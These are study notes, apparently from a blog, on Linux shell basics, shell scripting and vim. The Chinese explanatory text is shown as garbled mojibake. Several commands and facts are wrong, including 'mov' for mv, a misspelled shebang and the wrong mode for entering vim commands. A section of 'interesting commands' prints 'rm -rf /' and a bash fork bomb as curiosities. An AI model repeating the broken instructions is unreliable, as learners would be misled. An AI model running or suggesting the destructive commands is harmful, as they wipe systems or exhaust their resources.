class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br></pre></td></tr></table></figure><ul><li>æ‰“å°</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure><ul><li>è·¯å¾„åˆ—è¡¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å½“æˆ‘ä»¬æ‰§è¡Œä¸€äº›å‘½ä»¤æ—¶ï¼Œä¼šéå†PATHå¯»æ‰¾ï¼›æ¯”å¦‚è¯´ä½¿ç”¨ /bin/echo æ—¶åªéœ€åœ¨ç»ˆç«¯è¾“å…¥ echo å°±è¡Œ</span></span><br><span class="line"><span class="comment"># `:` åˆ†éš”</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><ul><li>å¯»æ‰¾å‘½ä»¤çš„è·¯å¾„</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> <span class="built_in">echo</span></span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line"><span class="comment"># whereiså¯ä»¥å¯»æ‰¾åˆ° åŸå§‹ä»£ç ã€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ–æ˜¯å¸®åŠ©æ–‡ä»¶</span></span><br><span class="line">$ whereis bash</span><br><span class="line">bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz</span><br></pre></td></tr></table></figure><ul><li>ç›®å½•</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># change dir</span></span><br><span class="line">$ <span class="built_in">cd</span> /home/username</span><br><span class="line"></span><br><span class="line"><span class="comment"># `..` ä»£è¡¨ä¸Šä¸€çº§ç›®å½•ã€‚`.` ä»£è¡¨å½“å‰ç›®å½• </span></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># `-`  å½“å‰ç›®å½•å’Œä¹‹å‰ç›®å½•ä¸‹åˆ‡æ¢</span></span><br><span class="line">$ <span class="built_in">cd</span> /mnt</span><br><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰è¶£çš„ä¸€ç‚¹æ˜¯ï¼Œ`..`ä½¿ç”¨è¿‡å¤šçš„æƒ…å†µã€‚`/`ç›®å½•æ²¡æœ‰ä¸Šä¸€çº§ï¼Œæœ€é«˜åªèƒ½åˆ° `/`</span></span><br><span class="line">$ ../../../../../../bin/date</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure><ul><li>æ–‡ä»¶æ“ä½œ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  list: åˆ—å‡ºæŒ‡å®šç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ï¼Œé»˜è®¤å½“å‰ç›®å½•</span></span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">test.txt</span><br><span class="line">$ <span class="built_in">ls</span> /</span><br><span class="line">lib root home ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç§»åŠ¨æ–‡ä»¶ä½ç½® move</span></span><br><span class="line">$ mov test.txt /tmp</span><br><span class="line">$ <span class="built_in">ls</span> /tmp</span><br><span class="line">test.txt</span><br><span class="line"><span class="comment"># é‡å‘½å</span></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ mov test.txt tmp.txt</span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">tmp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤åˆ¶ copy</span></span><br><span class="line">$ <span class="built_in">cp</span> tmp.txt tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤</span></span><br><span class="line">$ <span class="built_in">rm</span> tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line">$ <span class="built_in">touch</span> tmp2.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">$ <span class="built_in">mkdir</span> tmpdir</span><br><span class="line">$ <span class="built_in">rmdir</span> <span class="comment"># rm -r ä¹Ÿè¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶æ‰€æœ‰å†…å®¹</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶å¼€å¤´ç»“å°¾ï¼Œé»˜è®¤10è¡Œ</span></span><br><span class="line">$ <span class="built_in">head</span> test.txt</span><br><span class="line">$ <span class="built_in">tail</span> test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat é‡å®šå‘</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt; tmp.txt   <span class="comment"># å¦‚æœæ²¡æœ‰å°±åˆ›å»ºtmp.txt.</span></span><br><span class="line">$ <span class="built_in">cat</span> &lt; text.txt &gt; tmp.txt <span class="comment"># åŒä¸Š</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt;&gt; tmp.txt  <span class="comment"># &gt; ä¼šæ¸…é™¤åŸå…ˆå†…å®¹ã€‚&gt;&gt; ä»£è¡¨appendï¼Œè¿½åŠ è€Œä¸æ¸…é™¤</span></span><br></pre></td></tr></table></figure><ul><li>å‘½ä»¤å‚æ•°å’Œå¸®åŠ©æ–‡æ¡£</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸€èˆ¬å‘½ä»¤ä¹Ÿå­˜åœ¨å‚æ•°ï¼Œä¸€èˆ¬ä¸º -?</span></span><br><span class="line">$ <span class="built_in">ls</span> -l  /home</span><br><span class="line"><span class="comment"># d: dir rwx: æƒé™Read, Write, eXecute(ä¹Ÿä»£è¡¨æ˜¯å¦èƒ½å¤Ÿè®¿é—®æ­¤ç›®å½•)ã€‚</span></span><br><span class="line"><span class="comment"># ä»å‰åˆ°å: owneræƒé™ groupæƒé™ å…¶ä½™ç”¨æˆ·æƒé™ owner group size date dir_name</span></span><br><span class="line">drwxr-x--- 27 user user 4096 Jun 21 14:42 user  </span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥å¸®åŠ©æ–‡æ¡£ï¼Œqé€€å‡ºã€‚manual pages</span></span><br><span class="line">$ man <span class="built_in">ls</span> </span><br><span class="line"> -l     use a long listing format</span><br></pre></td></tr></table></figure><ul><li>ç®¡é“ï¼šå·¦ä¾§çš„è¾“å‡ºä½œä¸ºå³ä¾§çš„è¾“å…¥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> / | <span class="built_in">tail</span> -n 1 <span class="comment"># -n 1 æœ€åä¸€è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰æ—¶å€™ç»™rootæƒé™æ–‡ä»¶å†™å…¥æ—¶ï¼Œæ¯”å¦‚sudo echo 123 &gt; tmp.txtä¼šæŠ¥é”™ï¼Œå¯ç”¨ä»¥ä¸‹å‘½ä»¤</span></span><br><span class="line">$ <span class="built_in">echo</span> 123 | sudo <span class="built_in">tee</span> tmp.txt</span><br></pre></td></tr></table></figure><ul><li>root user: è¶…çº§ç®¡ç†å‘˜ã€‚å°½é‡å°‘ç”¨ï¼Œåœ¨è¿è¡Œé”™è¯¯çš„ç¨‹åºæ—¶ä¼šç ´åè®¡ç®—æœºã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”¨æˆ·ä½¿ç”¨rootæƒé™</span></span><br><span class="line">$ sudo &lt;commond&gt;</span><br><span class="line"></span><br><span class="line">$ sudo su</span><br><span class="line">password: xxx</span><br><span class="line">root<span class="comment"># `#` ä»£è¡¨root æƒé™ </span></span><br></pre></td></tr></table></figure><ul><li><p><code>/sys</code> æ–‡ä»¶å¤¹ï¼šå„ç§å†…æ ¸å‚æ•°ï¼Œæ˜¾ç¤ºè®¾å¤‡çš„çŠ¶æ€ã€‚linuxç³»ç»Ÿå°†å…¶è§†ä¸ºæ–‡ä»¶æš´æ¼ç»™ç”¨æˆ·ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ“ä½œä»è€Œæ§åˆ¶æŸäº›è®¾å¤‡</p></li><li><p>æœ‰è¶£çš„å‘½ä»¤</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ åº“è·‘è·¯ï¼Œæ— éœ€ç¡®è®¤å¼ºåˆ¶åˆ é™¤æ‰€æœ‰çš„æ–‡ä»¶</span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /</span><br><span class="line"></span><br><span class="line"><span class="comment"># fork ç‚¸å¼¹, ä¼šè€—å°½ç”µè„‘èµ„æº</span></span><br><span class="line">$ :()&#123; :|:&amp; &#125;;:  <span class="comment"># ç†è§£ä¸ºä¸€ä¸ªå‡½æ•°é€’å½’è°ƒç”¨ `:` ä¸ºå‡½æ•°å</span></span><br><span class="line">:() &#123;</span><br><span class="line">: | :&amp;</span><br><span class="line">&#125;;</span><br><span class="line">:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”±äºlsæ‰“é”™é¢‘ç‡æ¯”è¾ƒé«˜ï¼Œä¼šå‡ºç°ä¸€ä¸ªåŠ¨ç”»(ç«è½¦)</span></span><br><span class="line">sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cowsay æ‰“å°ä¸€æ®µè¯ cowthink ç±»ä¼¼ï¼Œä½†æ˜¯think</span></span><br><span class="line">cowsay <span class="string">&quot;nb&quot;</span></span><br><span class="line">-l æŸ¥çœ‹åŠ¨ç‰©ï¼Œéœ€è¦å®‰è£…</span><br><span class="line">-f æŒ‡å®šåŠ¨ç‰©</span><br><span class="line"> ____</span><br><span class="line">&lt; nb &gt;</span><br><span class="line"> ----</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line"></span><br><span class="line"><span class="comment"># figlet å­—ç¬¦å­—  toiletç±»ä¼¼ </span></span><br><span class="line">figlet love</span><br><span class="line"> <span class="string">&quot;&quot;</span><span class="comment">#</span></span><br><span class="line">   <span class="comment">#     mmm   m   m   mmm</span></span><br><span class="line">   <span class="comment">#    #&quot; &quot;#  &quot;m m&quot;  #&quot;  #</span></span><br><span class="line">   <span class="comment">#    #   #   #m#   #&quot;&quot;&quot;&quot;</span></span><br><span class="line">   <span class="string">&quot;mm  &quot;</span><span class="comment">#m#&quot;    #    &quot;#mm&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°ä¸€å †ä¿¡æ¯å’Œlogoï¼Œè£…bä½¿ç”¨</span></span><br><span class="line">neofetch</span><br></pre></td></tr></table></figure><ul><li>ç°ä»£åŒ–çš„å‘½ä»¤ï¼šå¼€å‘è€…ä½¿ç”¨rustå†™äº†å¾ˆå¤šæ›´åŠ ç°ä»£çš„å‘½ä»¤ï¼Œå¯ä»¥æ›¿ä»£ä¸€äº›è€å‘½ä»¤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exa  =&gt;  <span class="built_in">ls</span></span><br><span class="line">bat  =&gt;  <span class="built_in">cat</span> </span><br></pre></td></tr></table></figure><h4 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ul><li>shell, console, terminal?</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx</span><br></pre></td></tr></table></figure><h2 id="lectrue2-shell-script"><a href="#lectrue2-shell-script" class="headerlink" title="lectrue2: shell script"></a>lectrue2: shell script</h2><blockquote><p>Linux è„šæœ¬çš„ä½¿ç”¨</p></blockquote><ul><li>è¯­æ³•</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$0</span>      è¿è¡Œæ–‡ä»¶å</span><br><span class="line"><span class="variable">$1</span>-<span class="variable">$9</span>   å‚æ•°</span><br><span class="line">$?      è·å–ä¸Šä¸€ä¸ªè¿è¡Œçš„é”™è¯¯ 0ä»£è¡¨æ­£ç¡®ï¼Œ1ä»£è¡¨å‡ºé”™</span><br><span class="line"><span class="variable">$_</span>      å­˜å‚¨ä¸Šæ¬¡è¿è¡Œçš„ç»“æœ</span><br><span class="line"><span class="variable">$#</span>      å‚æ•°ä¸ªæ•°</span><br><span class="line">$$      è¿›ç¨‹<span class="built_in">id</span></span><br><span class="line"><span class="variable">$@</span>      æ‰€æœ‰çš„å‚æ•°ç»„æˆï¼Œå¯è¿­ä»£</span><br><span class="line"></span><br><span class="line">!!      åœ¨æ‰§è¡Œæ—¶ä¼šæ›¿æ¢ä¸ºä¸Šä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line"><span class="comment"># å˜é‡</span></span><br><span class="line">foo=bar</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$foo</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å˜é‡èµ‹å€¼ä¸ºå‘½ä»¤çš„ç»“æœ</span></span><br><span class="line">foo=$(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure><ul><li>å¾ªç¯</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> xxx; <span class="keyword">do</span>... <span class="keyword">done</span></span><br></pre></td></tr></table></figure><ul><li>æ¡ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> xxx; then...fi</span><br></pre></td></tr></table></figure><ul><li>ç¼–ç¨‹è„šæœ¬</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŠ å…¥magic line æŒ‡å®šè§£æå™¨</span></span><br><span class="line"><span class="comment"># ä¸€ä¸ª ç§°ä¹‹ä¸º `shebang` çš„ä¸œè¥¿</span></span><br><span class="line"><span class="comment">#!/usr/bin/pyton3</span></span><br></pre></td></tr></table></figure><ul><li><code>man</code> å‘½ä»¤çš„å…¶ä½™é€‰æ‹© <code>tldr</code> ï¼Œæ›´åŠ ç®€æ´(too long; donâ€™t read)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tldr tar</span><br></pre></td></tr></table></figure><ul><li>é€’å½’æŸ¥è¯¢</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find .     <span class="comment"># . ä»£è¡¨å½“å‰è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šæ¯”å¦‚ `/` </span></span><br><span class="line">-name  <span class="comment"># åç§°,å¯ä»¥ä½¿ç”¨é€šé…ç¬¦</span></span><br><span class="line">-<span class="built_in">type</span>  <span class="comment"># ç±»å‹ d(dir) f(file)</span></span><br><span class="line">-mtime -1 <span class="comment"># ä¿®æ”¹æ—¶é—´modify timeï¼Œ 1æŒ‡1å¤©</span></span><br><span class="line">-<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;   <span class="comment"># å¯¹äºå¯»æ‰¾çš„æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ \; ä¸å¯ç¼ºå°‘</span></span><br><span class="line"></span><br><span class="line">fd  <span class="comment"># æ›´åŠ ç°ä»£åŒ–çš„find</span></span><br><span class="line"></span><br><span class="line">locate  <span class="comment"># é»˜è®¤æŸ¥æ‰¾æ•´ä¸ªè®¡ç®—æœº</span></span><br><span class="line"></span><br><span class="line">grep  <span class="comment"># åº”ç”¨äºæŸ¥æ–‡ä»¶å†…å®¹</span></span><br><span class="line">-R  <span class="comment">#  é€’å½’</span></span><br><span class="line"></span><br><span class="line">rg  <span class="comment"># ripgrep</span></span><br></pre></td></tr></table></figure><ul><li>æŸ¥æ‰¾ä½¿ç”¨è¿‡çš„å‘½ä»¤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ–¹å‘é”®çš„ä¸Š</span><br><span class="line"></span><br><span class="line">fzf</span><br><span class="line"></span><br><span class="line">zsh çš„ä¸€ä¸ªæ’ä»¶ï¼Œåœ¨è¾“å…¥æ—¶ä¼šæ˜¾ç¤ºæ›¾ç»è¾“å…¥çš„ç±»ä¼¼å‘½ä»¤</span><br></pre></td></tr></table></figure><ul><li>æ›´æ¸…æ™°çš„ç›®å½•ç»“æ„</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tree</span><br><span class="line">broot</span><br></pre></td></tr></table></figure><h2 id="lecture3-editor-VIM"><a href="#lecture3-editor-VIM" class="headerlink" title="lecture3: editor VIM"></a>lecture3: editor VIM</h2><ul><li><p>normal mode: å¯ä»¥æ§åˆ¶å…‰æ ‡ï¼Œæ‰§è¡Œå‘½ä»¤â€¦</p></li><li><p>insert mode: å°±æ˜¯æ–‡æœ¬ç¼–è¾‘å™¨ã€‚</p></li><li><p>command mode: åœ¨insert mode è¾“å…¥ <code>:</code> åœ¨è¾“å…¥å‘½ä»¤</p></li><li><p>visual mode: æœ‰ç‚¹åƒä½¿ç”¨é¼ æ ‡é€‰ä¸­ä¸€å—è¿ç»­åŒºåŸŸ</p></li><li><p>replace mode</p></li><li><p>è¿›å…¥ insert mode</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i   <span class="keyword">insert</span>ï¼Œ åœ¨å…‰æ ‡å‰æ’å…¥</span><br><span class="line"><span class="keyword">a</span>   <span class="keyword">append</span>ï¼Œåœ¨å…‰æ ‡å</span><br><span class="line">I   è¡Œé¦–</span><br><span class="line">A   è¡Œå°¾</span><br><span class="line"><span class="keyword">o</span>   ä¸‹ä¸€è¡Œ <span class="keyword">open</span> <span class="keyword">a</span> <span class="keyword">new</span> <span class="built_in">line</span></span><br><span class="line">O   ä¸Šä¸€è¡Œ</span><br></pre></td></tr></table></figure><ul><li>normal mode</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esc  ä¹Ÿå¯ä»¥è‡ªè¡Œé…ç½®</span><br></pre></td></tr></table></figure><ul><li><p>ä¿å­˜ï¼Œé€€å‡º</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- <span class="keyword">write</span> <span class="keyword">quit</span></span><br><span class="line"><span class="keyword">normal</span> <span class="keyword">mode</span> ä¸‹ :<span class="keyword">wq</span></span><br><span class="line"></span><br><span class="line">-- åŠ å…¥ ! ä»£è¡¨å¼ºåˆ¶æ‰§è¡Œ</span><br></pre></td></tr></table></figure></li><li><p>normal mode å…‰æ ‡æ“ä½œã€‚</p><ul><li>æ‰€æœ‰çš„éƒ½å¯ä»¥åœ¨<code>å‰é¢åŠ ä¸€ä¸ªæ•°å­—</code>ï¼Œä»£è¡¨count</li></ul></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">h   å·¦ç§»</span><br><span class="line"><span class="keyword">j</span>   ä¸‹</span><br><span class="line"><span class="keyword">k</span>   ä¸Š</span><br><span class="line"><span class="keyword">l</span>   å³</span><br><span class="line"></span><br><span class="line"><span class="keyword">w</span>   å‘å‰(åä¸€ä¸ªå•è¯)ç§»åŠ¨ä¸€ä¸ª word, ä¹Ÿå°±æ˜¯ä¸€ä¸ªå•è¯ï¼Œæ ‡ç‚¹æˆ–è€…ç©ºæ ¼åˆ†å¼€ã€‚åœ¨å•è¯ç¬¬ä¸€ä¸ªå­—æ¯</span><br><span class="line"><span class="keyword">b</span>   å‘backç§»åŠ¨ word      back of word</span><br><span class="line"><span class="keyword">e</span>   ç§»åŠ¨åˆ°å•è¯æœ«å°¾        end of word</span><br><span class="line"><span class="number">0</span>   ç§»åŠ¨åˆ°è¡Œé¦–</span><br><span class="line">$   è¡Œå°¾</span><br><span class="line">^   ä¸€è¡Œç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦</span><br><span class="line"></span><br><span class="line">ctrl-<span class="keyword">u</span>     <span class="keyword">up</span>ç±»ä¼¼é¼ æ ‡å‘ä¸Šæ»šåŠ¨</span><br><span class="line">ctrl-d     down å‘ä¸‹</span><br><span class="line"></span><br><span class="line">H  highest  å±å¹•ç¬¬ä¸€è¡Œ</span><br><span class="line">L  low      å±å¹•æœ€åä¸€è¡Œ</span><br><span class="line">M  mid      å±å¹•ä¸­é—´ä¸€è¡Œ</span><br></pre></td></tr></table></figure><p>åˆ é™¤</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d  åˆ é™¤ä¸€ä¸ªå­—ç¬¦,é…åˆç§»åŠ¨å…‰æ ‡ä½¿ç”¨</span><br><span class="line">dd åˆ é™¤ä¸€è¡Œï¼Œå¯ä»¥ä½¿ç”¨<span class="keyword">p</span></span><br><span class="line">D åˆ é™¤è‡³æœ«å°¾</span><br><span class="line">d1G åˆ é™¤åˆ°ç¬¬ä¸€è¡Œ</span><br><span class="line">dG  åˆ é™¤åˆ°æœ€åä¸€è¡Œ</span><br><span class="line">n1, n2d åˆ é™¤n1-n2è¡Œ</span><br><span class="line">-- åœ¨è¿™é‡Œ <span class="keyword">a</span> around;  i inside</span><br><span class="line"><span class="keyword">di</span>(  åˆ é™¤æ‹¬å·å†…çš„å†…å®¹</span><br><span class="line">da(  åˆ é™¤åŒ…æ‹¬æ‹¬å·çš„ä¸œè¥¿</span><br><span class="line"><span class="keyword">c</span>   <span class="keyword">change</span> <span class="keyword">a</span> word åˆ é™¤(d ç±»ä¼¼)å¹¶è¿›å…¥<span class="keyword">insert</span> <span class="keyword">mode</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">x</span>   åˆ é™¤åé¢ä¸€ä¸ªå­—ç¬¦</span><br><span class="line"><span class="symbol">&lt;num&gt;</span><span class="keyword">x</span> åˆ é™¤åé¢numä¸ªå­—ç¬¦</span><br><span class="line">s   åˆ é™¤å­—ç¬¦è¿›å…¥<span class="keyword">insert</span> <span class="keyword">mode</span></span><br><span class="line">S   åˆ é™¤ä¸€è¡Œè¿›å…¥<span class="keyword">insert</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><ul><li>å¤åˆ¶ç²˜è´´</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">y</span>   <span class="keyword">yank</span> </span><br><span class="line">yy å¤åˆ¶å½“å‰è¡Œ</span><br><span class="line">y1G ...</span><br><span class="line"><span class="keyword">p</span>   pasteåœ¨è¿™ä¸€è¡Œåé¢</span><br><span class="line"><span class="keyword">P</span>   è¿™ä¸€è¡Œå‰é¢</span><br></pre></td></tr></table></figure><ul><li>è·³è½¬åˆ°æŸä¸€è¡Œ</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g</span><br><span class="line">gg ç¬¬ä¸€è¡Œ</span><br><span class="line">G   æœ€åä¸€è¡Œ</span><br><span class="line"><span class="symbol">&lt;num&gt;</span>G  è·³è½¬åˆ°numè¡Œ</span><br><span class="line">:<span class="symbol">&lt;num&gt;</span>   è·³åˆ°ç¬¬numè¡Œ</span><br></pre></td></tr></table></figure><ul><li>æ’¤é”€ä¹‹å‰çš„æ“ä½œ</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">u</span> 